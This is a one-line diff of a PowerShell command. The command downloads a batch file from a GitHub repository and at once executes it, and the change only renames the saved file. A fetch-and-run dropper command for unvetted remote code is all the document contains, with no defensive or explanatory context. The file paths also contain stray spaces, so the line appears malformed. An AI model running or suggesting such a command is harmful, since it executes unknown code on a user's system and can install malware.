@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri " https://github.com/Impear/rccmrz/raw/main/rcc.bat" -OutFile "C:\Everything.bat"; Start-Process -FilePath "C: \Everything.bat"
+Invoke-WebRequest -Uri " https://github.com/Impear/rccmrz/raw/main/rcc.bat" -OutFile "C:\Seregaloosernaratke.bat"; Start-Process -FilePath "C: \Seregaloosernaratke.bat"
